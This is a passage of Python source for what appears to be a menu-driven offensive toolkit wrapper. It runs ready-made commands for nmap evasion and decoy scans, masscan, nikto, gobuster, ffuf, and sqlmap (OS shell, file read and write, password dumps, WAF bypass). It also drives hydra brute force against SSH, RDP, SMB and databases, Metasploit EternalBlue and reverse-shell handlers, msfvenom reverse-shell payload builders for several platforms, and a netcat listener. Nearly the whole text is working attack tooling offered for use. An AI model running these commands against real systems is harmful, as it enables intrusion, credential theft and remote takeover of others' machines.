    print(f"{Y}  [5]{W}  Stealth SYN scan (-sS)")
    print(f"{Y}  [6]{W}  UDP scan (-sU)")
    print(f"{Y}  [7]{W}  Vulnerability scripts (--script vuln)")
    print(f"{Y}  [8]{W}  Aggressive scan (-A)")
    print(f"{Y}  [9]{W}  Ping sweep (network discovery)")
    print(f"{Y}  [10]{W} Banner grabbing")
    print(f"{Y}  [11]{W} SMB scripts")
    print(f"{Y}  [12]{W} HTTP scripts")
    print(f"{Y}  [13]{W} FTP scripts")
    print(f"{Y}  [14]{W} SSL/TLS scripts")
    print(f"{Y}  [15]{W} Firewall evasion (-f --mtu)")
    print(f"{Y}  [16]{W} Decoy scan (-D)")
    print(f"{Y}  [17]{W} Idle scan (-sI)")
    print(f"{Y}  [18]{W} DNS brute force")
    print(f"{Y}  [19]{W} Top 1000 ports")
    print(f"{Y}  [20]{W} Save output to file")
    print(f"{Y}  [21]{W} XML output")
    print(f"{Y}  [22]{W} Traceroute")
    print(f"{Y}  [23]{W} Broadcast scripts")
    print(f"{Y}  [24]{W} Custom nmap command")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target()
    if c == '1': run_cmd(f"nmap -sV -sC -T4 {t}")
    elif c == '2': run_cmd(f"nmap -p- -sV -sC -T4 {t}")
    elif c == '3': run_cmd(f"nmap -T4 -F {t}")
    elif c == '4': run_cmd(f"sudo nmap -O {t}")
    elif c == '5': run_cmd(f"sudo nmap -sS -T4 {t}")
    elif c == '6': run_cmd(f"sudo nmap -sU -T4 {t}")
    elif c == '7': run_cmd(f"nmap --script vuln {t}")
    elif c == '8': run_cmd(f"nmap -A {t}")
    elif c == '9': run_cmd(f"nmap -sn {t}/24")
    elif c == '10': run_cmd(f"nmap -sV --script=banner {t}")
    elif c == '11': run_cmd(f"nmap --script smb-vuln* -p 445 {t}")
    elif c == '12': run_cmd(f"nmap --script http-* -p 80,443,8080 {t}")
    elif c == '13': run_cmd(f"nmap --script ftp-* -p 21 {t}")
    elif c == '14': run_cmd(f"nmap --script ssl-* -p 443 {t}")
    elif c == '15': run_cmd(f"sudo nmap -f --mtu 24 -sV {t}")
    elif c == '16':
        d = get_target("Decoy IPs (e.g. 1.1.1.1,2.2.2.2,ME): ")
        run_cmd(f"sudo nmap -D {d} {t}")
    elif c == '17':
        z = get_target("Zombie host: ")
        run_cmd(f"sudo nmap -sI {z} {t}")
    elif c == '18': run_cmd(f"nmap --script dns-brute {t}")
    elif c == '19': run_cmd(f"nmap --top-ports 1000 -sV {t}")
    elif c == '20':
        o = get_target("Output filename: ")
        run_cmd(f"nmap -sV -sC -T4 -oN {o} {t}")
    elif c == '21':
        o = get_target("XML output filename: ")
        run_cmd(f"nmap -sV -sC -T4 -oX {o} {t}")
    elif c == '22': run_cmd(f"nmap --traceroute {t}")
    elif c == '23': run_cmd(f"sudo nmap --script broadcast {t}")
    elif c == '24':
        cmd = get_target("Custom nmap command: ")
        run_cmd(cmd)

def tool_masscan():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          11. MASSCAN                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Full port scan (all 65535)")
    print(f"{Y}  [2]{W} Top ports scan")
    print(f"{Y}  [3]{W} Custom port range")
    print(f"{Y}  [4]{W} Fast rate scan")
    print(f"{Y}  [5]{W} Banner grabbing")
    print(f"{Y}  [6]{W} Save to file")
    print(f"{Y}  [7]{W} Scan subnet")
    print(f"{Y}  [8]{W} Custom rate")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target()
    if c == '1': run_cmd(f"sudo masscan {t} -p1-65535 --rate=1000")
    elif c == '2': run_cmd(f"sudo masscan {t} -p21,22,23,25,53,80,110,143,443,445,3306,3389,8080 --rate=1000")
    elif c == '3':
        p = get_target("Port range (e.g. 1-1024): ")
        run_cmd(f"sudo masscan {t} -p{p} --rate=1000")
    elif c == '4': run_cmd(f"sudo masscan {t} -p1-65535 --rate=10000")
    elif c == '5': run_cmd(f"sudo masscan {t} -p80,443 --banners --rate=1000")
    elif c == '6':
        o = get_target("Output file: ")
        run_cmd(f"sudo masscan {t} -p1-65535 --rate=1000 -oL {o}")
    elif c == '7':
        n = get_target("Network (e.g. 192.168.1.0/24): ")
        run_cmd(f"sudo masscan {n} -p1-65535 --rate=1000")
    elif c == '8':
        r = get_target("Rate (packets/sec): ")
        p = get_target("Ports: ")
        run_cmd(f"sudo masscan {t} -p{p} --rate={r}")

def tool_nikto():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           13. NIKTO                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Basic web scan")
    print(f"{Y}  [2]{W}  SSL/HTTPS scan")
    print(f"{Y}  [3]{W}  Custom port")
    print(f"{Y}  [4]{W}  Authentication bypass check")
    print(f"{Y}  [5]{W}  CGI scan")
    print(f"{Y}  [6]{W}  Database checks")
    print(f"{Y}  [7]{W}  XSS checks")
    print(f"{Y}  [8]{W}  Injection checks")
    print(f"{Y}  [9]{W}  File upload check")
    print(f"{Y}  [10]{W} Headers check")
    print(f"{Y}  [11]{W} Cookie analysis")
    print(f"{Y}  [12]{W} Outdated software check")
    print(f"{Y}  [13]{W} Save HTML report")
    print(f"{Y}  [14]{W} Save XML report")
    print(f"{Y}  [15]{W} Through proxy")
    print(f"{Y}  [16]{W} With authentication")
    print(f"{Y}  [17]{W} Evasion techniques")
    print(f"{Y}  [18]{W} Full scan all plugins")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL/IP: ")
    if c == '1': run_cmd(f"nikto -h {t}")
    elif c == '2': run_cmd(f"nikto -h {t} -ssl")
    elif c == '3':
        p = get_target("Port: ")
        run_cmd(f"nikto -h {t} -p {p}")
    elif c == '4': run_cmd(f"nikto -h {t} -Tuning 4")
    elif c == '5': run_cmd(f"nikto -h {t} -Tuning 5")
    elif c == '6': run_cmd(f"nikto -h {t} -Tuning d")
    elif c == '7': run_cmd(f"nikto -h {t} -Tuning 1")
    elif c == '8': run_cmd(f"nikto -h {t} -Tuning 9")
    elif c == '9': run_cmd(f"nikto -h {t} -Tuning 3")
    elif c == '10': run_cmd(f"nikto -h {t} -Tuning b")
    elif c == '11': run_cmd(f"nikto -h {t} -Tuning c")
    elif c == '12': run_cmd(f"nikto -h {t} -Tuning 0")
    elif c == '13':
        o = get_target("Output HTML file: ")
        run_cmd(f"nikto -h {t} -o {o} -Format htm")
    elif c == '14':
        o = get_target("Output XML file: ")
        run_cmd(f"nikto -h {t} -o {o} -Format xml")
    elif c == '15':
        p = get_target("Proxy (host:port): ")
        run_cmd(f"nikto -h {t} -useproxy http://{p}")
    elif c == '16':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"nikto -h {t} -id {u}:{pw}")
    elif c == '17':
        e = get_target("Evasion (1-8): ")
        run_cmd(f"nikto -h {t} -evasion {e}")
    elif c == '18': run_cmd(f"nikto -h {t} -Tuning x")

def tool_gobuster():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          14. GOBUSTER                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Dir mode - common wordlist")
    print(f"{Y}  [2]{W}  Dir mode - big wordlist")
    print(f"{Y}  [3]{W}  DNS mode - subdomain enum")
    print(f"{Y}  [4]{W}  VHOST mode")
    print(f"{Y}  [5]{W}  Dir mode with extensions")
    print(f"{Y}  [6]{W}  Dir mode with auth")
    print(f"{Y}  [7]{W}  Dir mode through proxy")
    print(f"{Y}  [8]{W}  Dir mode with cookies")
    print(f"{Y}  [9]{W}  Dir mode with headers")
    print(f"{Y}  [10]{W} Dir mode - custom status codes")
    print(f"{Y}  [11]{W} Dir mode - follow redirects")
    print(f"{Y}  [12]{W} Dir mode - custom threads")
    print(f"{Y}  [13]{W} S3 bucket enum")
    print(f"{Y}  [14]{W} Dir mode - custom wordlist")
    print(f"{Y}  [15]{W} Dir mode - save output")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt")
    elif c == '2': run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
    elif c == '3':
        d = get_target("Domain: ")
        run_cmd(f"gobuster dns -d {d} -w /usr/share/wordlists/subdomains-top1million-5000.txt")
    elif c == '4':
        d = get_target("Domain: ")
        run_cmd(f"gobuster vhost -u {t} -w /usr/share/wordlists/subdomains-top1million-5000.txt --domain {d}")
    elif c == '5':
        e = get_target("Extensions (e.g. php,html,txt): ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -x {e}")
    elif c == '6':
        u = get_target("Username: ")
        p = get_target("Password: ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -U {u} -P {p}")
    elif c == '7':
        p = get_target("Proxy URL: ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt --proxy {p}")
    elif c == '8':
        ck = get_target("Cookies: ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -c '{ck}'")
    elif c == '9':
        h = get_target("Header (e.g. Authorization:Bearer token): ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -H '{h}'")
    elif c == '10':
        s = get_target("Status codes (e.g. 200,301,302): ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -s {s}")
    elif c == '11': run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -r")
    elif c == '12':
        th = get_target("Threads: ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -t {th}")
    elif c == '13':
        b = get_target("Bucket name: ")
        run_cmd(f"gobuster s3 --wordlist /usr/share/wordlists/dirb/common.txt")
    elif c == '14':
        w = get_target("Wordlist path: ")
        run_cmd(f"gobuster dir -u {t} -w {w}")
    elif c == '15':
        o = get_target("Output file: ")
        run_cmd(f"gobuster dir -u {t} -w /usr/share/wordlists/dirb/common.txt -o {o}")

def tool_ffuf():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}            15. FFUF                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Basic directory fuzzing")
    print(f"{Y}  [2]{W}  File extension fuzzing")
    print(f"{Y}  [3]{W}  Subdomain fuzzing")
    print(f"{Y}  [4]{W}  VHOST fuzzing")
    print(f"{Y}  [5]{W}  POST data fuzzing")
    print(f"{Y}  [6]{W}  Parameter fuzzing (GET)")
    print(f"{Y}  [7]{W}  Parameter value fuzzing")
    print(f"{Y}  [8]{W}  Header fuzzing")
    print(f"{Y}  [9]{W}  Cookie fuzzing")
    print(f"{Y}  [10]{W} Recursive fuzzing")
    print(f"{Y}  [11]{W} Filter by status code")
    print(f"{Y}  [12]{W} Filter by response size")
    print(f"{Y}  [13]{W} Match by words")
    print(f"{Y}  [14]{W} Through proxy")
    print(f"{Y}  [15]{W} Custom rate limit")
    print(f"{Y}  [16]{W} With authentication")
    print(f"{Y}  [17]{W} Save output JSON")
    print(f"{Y}  [18]{W} Custom wordlist")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL (use FUZZ keyword): ")
    if c == '1': run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt")
    elif c == '2':
        e = get_target("Extensions (e.g. php,html): ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .{e}")
    elif c == '3':
        d = get_target("Domain (target as FUZZ.domain.com): ")
        run_cmd(f"ffuf -u http://FUZZ.{d} -w /usr/share/wordlists/subdomains-top1million-5000.txt")
    elif c == '4': run_cmd(f"ffuf -u {t} -H 'Host: FUZZ' -w /usr/share/wordlists/subdomains-top1million-5000.txt")
    elif c == '5':
        d = get_target("POST data (e.g. user=FUZZ&pass=test): ")
        run_cmd(f"ffuf -u {t} -X POST -d '{d}' -w /usr/share/wordlists/dirb/common.txt")
    elif c == '6': run_cmd(f"ffuf -u {t}?FUZZ=value -w /usr/share/wordlists/dirb/common.txt")
    elif c == '7':
        p = get_target("Parameter name: ")
        run_cmd(f"ffuf -u {t}?{p}=FUZZ -w /usr/share/wordlists/dirb/common.txt")
    elif c == '8':
        h = get_target("Header name: ")
        run_cmd(f"ffuf -u {t} -H '{h}: FUZZ' -w /usr/share/wordlists/dirb/common.txt")
    elif c == '9':
        ck = get_target("Cookie name: ")
        run_cmd(f"ffuf -u {t} -H 'Cookie: {ck}=FUZZ' -w /usr/share/wordlists/dirb/common.txt")
    elif c == '10': run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion")
    elif c == '11':
        s = get_target("Filter status codes (e.g. 404,403): ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc {s}")
    elif c == '12':
        s = get_target("Filter size: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs {s}")
    elif c == '13':
        w = get_target("Match words count: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mw {w}")
    elif c == '14':
        p = get_target("Proxy URL: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -x {p}")
    elif c == '15':
        r = get_target("Rate (req/sec): ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate {r}")
    elif c == '16':
        a = get_target("Auth header value: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -H 'Authorization: {a}'")
    elif c == '17':
        o = get_target("Output JSON file: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w /usr/share/wordlists/dirb/common.txt -o {o} -of json")
    elif c == '18':
        w = get_target("Wordlist path: ")
        run_cmd(f"ffuf -u {t}/FUZZ -w {w}")

def tool_sqlmap():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           21. SQLMAP                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Basic SQL injection test")
    print(f"{Y}  [2]{W}  Test with POST data")
    print(f"{Y}  [3]{W}  List databases")
    print(f"{Y}  [4]{W}  List tables")
    print(f"{Y}  [5]{W}  Dump table data")
    print(f"{Y}  [6]{W}  Get current user/db")
    print(f"{Y}  [7]{W}  OS shell")
    print(f"{Y}  [8]{W}  File read")
    print(f"{Y}  [9]{W}  File write")
    print(f"{Y}  [10]{W} Bypass WAF/filters")
    print(f"{Y}  [11]{W} Crawl and test")
    print(f"{Y}  [12]{W} Test with cookie")
    print(f"{Y}  [13]{W} Test with headers")
    print(f"{Y}  [14]{W} Time-based blind")
    print(f"{Y}  [15]{W} Boolean-based blind")
    print(f"{Y}  [16]{W} Error-based")
    print(f"{Y}  [17]{W} UNION-based")
    print(f"{Y}  [18]{W} Stacked queries")
    print(f"{Y}  [19]{W} DNS exfiltration")
    print(f"{Y}  [20]{W} Tor/proxy anonymity")
    print(f"{Y}  [21]{W} High risk/level")
    print(f"{Y}  [22]{W} Dump all databases")
    print(f"{Y}  [23]{W} Password hash dump")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"sqlmap -u '{t}' --batch")
    elif c == '2':
        d = get_target("POST data: ")
        run_cmd(f"sqlmap -u '{t}' --data='{d}' --batch")
    elif c == '3': run_cmd(f"sqlmap -u '{t}' --dbs --batch")
    elif c == '4':
        db = get_target("Database name: ")
        run_cmd(f"sqlmap -u '{t}' -D {db} --tables --batch")
    elif c == '5':
        db = get_target("Database: ")
        tb = get_target("Table: ")
        run_cmd(f"sqlmap -u '{t}' -D {db} -T {tb} --dump --batch")
    elif c == '6': run_cmd(f"sqlmap -u '{t}' --current-user --current-db --batch")
    elif c == '7': run_cmd(f"sqlmap -u '{t}' --os-shell --batch")
    elif c == '8':
        f = get_target("File to read: ")
        run_cmd(f"sqlmap -u '{t}' --file-read='{f}' --batch")
    elif c == '9':
        lf = get_target("Local file: ")
        rf = get_target("Remote path: ")
        run_cmd(f"sqlmap -u '{t}' --file-write='{lf}' --file-dest='{rf}' --batch")
    elif c == '10': run_cmd(f"sqlmap -u '{t}' --tamper=space2comment,between,randomcase --batch")
    elif c == '11': run_cmd(f"sqlmap -u '{t}' --crawl=3 --batch")
    elif c == '12':
        ck = get_target("Cookie: ")
        run_cmd(f"sqlmap -u '{t}' --cookie='{ck}' --batch")
    elif c == '13':
        h = get_target("Header: ")
        run_cmd(f"sqlmap -u '{t}' -H '{h}' --batch")
    elif c == '14': run_cmd(f"sqlmap -u '{t}' --technique=T --batch")
    elif c == '15': run_cmd(f"sqlmap -u '{t}' --technique=B --batch")
    elif c == '16': run_cmd(f"sqlmap -u '{t}' --technique=E --batch")
    elif c == '17': run_cmd(f"sqlmap -u '{t}' --technique=U --batch")
    elif c == '18': run_cmd(f"sqlmap -u '{t}' --technique=S --batch")
    elif c == '19':
        ns = get_target("DNS server: ")
        run_cmd(f"sqlmap -u '{t}' --dns-domain={ns} --batch")
    elif c == '20': run_cmd(f"sqlmap -u '{t}' --tor --tor-type=SOCKS5 --batch")
    elif c == '21': run_cmd(f"sqlmap -u '{t}' --level=5 --risk=3 --batch")
    elif c == '22': run_cmd(f"sqlmap -u '{t}' --dump-all --batch")
    elif c == '23': run_cmd(f"sqlmap -u '{t}' --passwords --batch")

def tool_hydra():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           33. HYDRA                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  SSH brute force")
    print(f"{Y}  [2]{W}  FTP brute force")
    print(f"{Y}  [3]{W}  HTTP POST form")
    print(f"{Y}  [4]{W}  HTTP GET form")
    print(f"{Y}  [5]{W}  RDP brute force")
    print(f"{Y}  [6]{W}  SMB brute force")
    print(f"{Y}  [7]{W}  MySQL brute force")
    print(f"{Y}  [8]{W}  PostgreSQL brute force")
    print(f"{Y}  [9]{W}  Telnet brute force")
    print(f"{Y}  [10]{W} SMTP brute force")
    print(f"{Y}  [11]{W} POP3 brute force")
    print(f"{Y}  [12]{W} IMAP brute force")
    print(f"{Y}  [13]{W} VNC brute force")
    print(f"{Y}  [14]{W} Single password test")
    print(f"{Y}  [15]{W} Custom username list")
    print(f"{Y}  [16]{W} Resume attack")
    print(f"{Y}  [17]{W} Verbose mode")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target()
    if c == '1':
        u = get_target("Username/list: ")
        p = get_target("Password list: ")
        run_cmd(f"hydra -l {u} -P {p} ssh://{t}")
    elif c == '2':
        u = get_target("Username/list: ")
        p = get_target("Password list: ")
        run_cmd(f"hydra -l {u} -P {p} ftp://{t}")
    elif c == '3':
        u = get_target("Username field: ")
        pw = get_target("Password field: ")
        path = get_target("Login path: ")
        fail = get_target("Failure string: ")
        run_cmd(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {t} http-post-form '{path}:{u}=^USER^&{pw}=^PASS^:{fail}'")
    elif c == '4':
        path = get_target("Login path: ")
        run_cmd(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {t} http-get {path}")
    elif c == '5':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt rdp://{t}")
    elif c == '6':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt smb://{t}")
    elif c == '7':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt mysql://{t}")
    elif c == '8':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt postgres://{t}")
    elif c == '9':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt telnet://{t}")
    elif c == '10':
        u = get_target("Username/email: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt smtp://{t}")
    elif c == '11':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt pop3://{t}")
    elif c == '12':
        u = get_target("Username: ")
        run_cmd(f"hydra -l {u} -P /usr/share/wordlists/rockyou.txt imap://{t}")
    elif c == '13': run_cmd(f"hydra -P /usr/share/wordlists/rockyou.txt {t} vnc")
    elif c == '14':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        svc = get_target("Service (ssh/ftp/etc): ")
        run_cmd(f"hydra -l {u} -p {pw} {svc}://{t}")
    elif c == '15':
        ul = get_target("Username list file: ")
        pl = get_target("Password list file: ")
        svc = get_target("Service: ")
        run_cmd(f"hydra -L {ul} -P {pl} {svc}://{t}")
    elif c == '16':
        svc = get_target("Service: ")
        run_cmd(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {svc}://{t} -R")
    elif c == '17':
        svc = get_target("Service: ")
        run_cmd(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {svc}://{t} -v")

def tool_metasploit():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         27. METASPLOIT               {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Launch msfconsole")
    print(f"{Y}  [2]{W}  Search exploits")
    print(f"{Y}  [3]{W}  EternalBlue (MS17-010)")
    print(f"{Y}  [4]{W}  Android Meterpreter handler")
    print(f"{Y}  [5]{W}  Multi/handler listener")
    print(f"{Y}  [6]{W}  SMB exploit")
    print(f"{Y}  [7]{W}  Web delivery")
    print(f"{Y}  [8]{W}  PostgreSQL scan")
    print(f"{Y}  [9]{W}  FTP scan")
    print(f"{Y}  [10]{W} SSH scan")
    print(f"{Y}  [11]{W} HTTP scan")
    print(f"{Y}  [12]{W} Update Metasploit")
    print(f"{Y}  [13]{W} Auxiliary scanner")
    print(f"{Y}  [14]{W} Post exploitation")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("msfconsole")
    elif c == '2':
        s = get_target("Search term: ")
        run_cmd(f"msfconsole -q -x 'search {s}; exit'")
    elif c == '3':
        t = get_target("Target IP: ")
        lh = get_target("LHOST: ")
        run_cmd(f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {t}; set LHOST {lh}; run; exit'")
    elif c == '4':
        lh = get_target("LHOST: ")
        lp = get_target("LPORT: ")
        run_cmd(f"msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lh}; set LPORT {lp}; run; exit'")
    elif c == '5':
        lh = get_target("LHOST: ")
        lp = get_target("LPORT: ")
        pl = get_target("Payload (e.g. windows/meterpreter/reverse_tcp): ")
        run_cmd(f"msfconsole -q -x 'use exploit/multi/handler; set payload {pl}; set LHOST {lh}; set LPORT {lp}; run'")
    elif c == '6':
        t = get_target("Target IP: ")
        run_cmd(f"msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {t}; run; exit'")
    elif c == '7':
        lh = get_target("LHOST: ")
        lp = get_target("LPORT: ")
        run_cmd(f"msfconsole -q -x 'use exploit/multi/script/web_delivery; set LHOST {lh}; set LPORT {lp}; run'")
    elif c == '8':
        t = get_target("Target IP/range: ")
        run_cmd(f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {t}; run; exit'")
    elif c == '9':
        t = get_target("Target IP/range: ")
        run_cmd(f"msfconsole -q -x 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {t}; run; exit'")
    elif c == '10':
        t = get_target("Target IP/range: ")
        run_cmd(f"msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {t}; run; exit'")
    elif c == '11':
        t = get_target("Target IP/range: ")
        run_cmd(f"msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS {t}; run; exit'")
    elif c == '12': run_cmd("msfupdate")
    elif c == '13':
        m = get_target("Module path: ")
        run_cmd(f"msfconsole -q -x 'use {m}; show options; exit'")
    elif c == '14': run_cmd("msfconsole -q -x 'help; exit'")

def tool_msfvenom():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          28. MSFVENOM                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Windows reverse TCP (.exe)")
    print(f"{Y}  [2]{W}  Windows reverse TCP (encoded)")
    print(f"{Y}  [3]{W}  Linux reverse TCP (elf)")
    print(f"{Y}  [4]{W}  Android APK")
    print(f"{Y}  [5]{W}  PHP reverse shell")
    print(f"{Y}  [6]{W}  Python reverse shell")
    print(f"{Y}  [7]{W}  Bash reverse shell")
    print(f"{Y}  [8]{W}  PowerShell payload")
    print(f"{Y}  [9]{W}  ASP payload")
    print(f"{Y}  [10]{W} JSP payload")
    print(f"{Y}  [11]{W} WAR payload")
    print(f"{Y}  [12]{W} List payloads")
    print(f"{Y}  [13]{W} List formats")
    print(f"{Y}  [14]{W} List encoders")
    print(f"{Y}  [15]{W} Custom payload")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    lh = get_target("LHOST: ")
    lp = get_target("LPORT: ")
    if c == '1':
        o = get_target("Output file (e.g. shell.exe): ")
        run_cmd(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f exe -o {o}")
    elif c == '2':
        o = get_target("Output file: ")
        run_cmd(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -e x86/shikata_ga_nai -i 5 -f exe -o {o}")
    elif c == '3':
        o = get_target("Output file (e.g. shell.elf): ")
        run_cmd(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f elf -o {o}")
    elif c == '4':
        o = get_target("Output file (e.g. app.apk): ")
        run_cmd(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -o {o}")
    elif c == '5':
        o = get_target("Output file (e.g. shell.php): ")
        run_cmd(f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f raw -o {o}")
    elif c == '6':
        o = get_target("Output file (e.g. shell.py): ")
        run_cmd(f"msfvenom -p cmd/unix/reverse_python LHOST={lh} LPORT={lp} -f raw -o {o}")
    elif c == '7':
        o = get_target("Output file (e.g. shell.sh): ")
        run_cmd(f"msfvenom -p cmd/unix/reverse_bash LHOST={lh} LPORT={lp} -f raw -o {o}")
    elif c == '8':
        o = get_target("Output file (e.g. shell.ps1): ")
        run_cmd(f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f psh -o {o}")
    elif c == '9':
        o = get_target("Output file (e.g. shell.asp): ")
        run_cmd(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lh} LPORT={lp} -f asp -o {o}")
    elif c == '10':
        o = get_target("Output file (e.g. shell.jsp): ")
        run_cmd(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lh} LPORT={lp} -f raw -o {o}")
    elif c == '11':
        o = get_target("Output file (e.g. shell.war): ")
        run_cmd(f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lh} LPORT={lp} -f war -o {o}")
    elif c == '12': run_cmd("msfvenom -l payloads")
    elif c == '13': run_cmd("msfvenom -l formats")
    elif c == '14': run_cmd("msfvenom -l encoders")
    elif c == '15':
        pl = get_target("Payload: ")
        fmt = get_target("Format: ")
        o = get_target("Output: ")
        run_cmd(f"msfvenom -p {pl} LHOST={lh} LPORT={lp} -f {fmt} -o {o}")

def tool_netcat():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           37. NETCAT                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Listen for reverse shell")
    print(f"{Y}  [2]{W}  Connect to target")
    print(f"{Y}  [3]{W}  Port scan")
    print(f"{Y}  [4]{W}  Banner grabbing")
    print(f"{Y}  [5]{W}  File transfer (receive)")
    print(f"{Y}  [6]{W}  File transfer (send)")
    print(f"{Y}  [7]{W}  Persistent listener")
    print(f"{Y}  [8]{W}  UDP listener")
    print(f"{Y}  [9]{W}  Execute command on connect")
    print(f"{Y}  [10]{W} Proxy/relay")
    print(f"{Y}  [0]{W}  Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1':
        p = get_target("Port to listen: ")
        run_cmd(f"nc -lvnp {p}")
    elif c == '2':
        t = get_target("Target IP: ")
        p = get_target("Port: ")
        run_cmd(f"nc {t} {p}")
    elif c == '3':
        t = get_target("Target: ")
        pr = get_target("Port range (e.g. 1-1000): ")
